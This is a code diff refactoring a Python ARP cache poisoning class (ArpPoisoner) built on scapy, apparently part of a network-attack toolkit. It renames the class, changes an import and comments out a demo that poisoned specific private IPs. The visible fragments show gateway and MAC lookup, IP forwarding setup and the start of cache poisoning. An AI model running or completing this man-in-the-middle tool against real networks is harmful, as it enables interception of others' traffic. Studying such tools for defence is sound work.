@@ -1,10 +1,10 @@
-from src.attacker import Attacker
+from netattacker.attacker import AttackerBaseClass
 
 from scapy.all import ARP, Ether, IP, ICMP, send, sr1, srp1
 import platform
 import time
 
-class ArpPoisner(Attacker):
+class ArpPoisoner(AttackerBaseClass):
 	"""
 	Parameters
 	----------
@@ -31,12 +31,12 @@ class ArpPoisner(Attacker):
 			The target's hostname or IP address
 		"""
 		super().__init__(target, attack="ARP_POISON")
-		self.gateway_ipv4 = ArpPoisner.get_default_gateway_ipv4()
-		self.gateway_mac = ArpPoisner.get_mac(self.gateway_ipv4)
+		self.gateway_ipv4 = ArpPoisoner.get_default_gateway_ipv4()
+		self.gateway_mac = ArpPoisoner.get_mac(self.gateway_ipv4)
 
 	@property
 	def target_mac(self):
-		return ArpPoisner.get_mac(self.target_ipv4)
+		return ArpPoisoner.get_mac(self.target_ipv4)
 
 	@staticmethod
 	def setup_config():
@@ -83,7 +83,7 @@ class ArpPoisner(Attacker):
 		"""
 
 		# Enable IPv4 forwarding
-		ArpPoisner.setup_config()
+		ArpPoisoner.setup_config()
 
 		print("[*] Poisoning router's and target's ARP cache")
 		# Poison gateway's cache
@@ -115,16 +115,16 @@ class ArpPoisner(Attacker):
 	# 	return (f'{self.__class__.__name__}('
 	#			f'{self.target_ipv4})')
 
-def main():
-	a = ArpPoisner("172.27.93.157")
-	print(a)
-	print(a.target_mac)
-	a.target_ipv4 = "172.20.10.2"
-	print(a.target_mac)
-	a.print_target_ip()
-	a.print_gateway_mac()
-	a.print_gateway_ipv4()
-	a.start()
+# def main():
+# 	a = ArpPoisoner("172.27.93.157")
+# 	print(a)
+# 	print(a.target_mac)
+# 	a.target_ipv4 = "172.20.10.2"
+# 	print(a.target_mac)
+# 	a.print_target_ip()
+# 	a.print_gateway_mac()
+# 	a.print_gateway_ipv4()
+# 	a.start()
 
-if __name__ == "__main__":
-	main()
+# if __name__ == "__main__":
+# 	main()
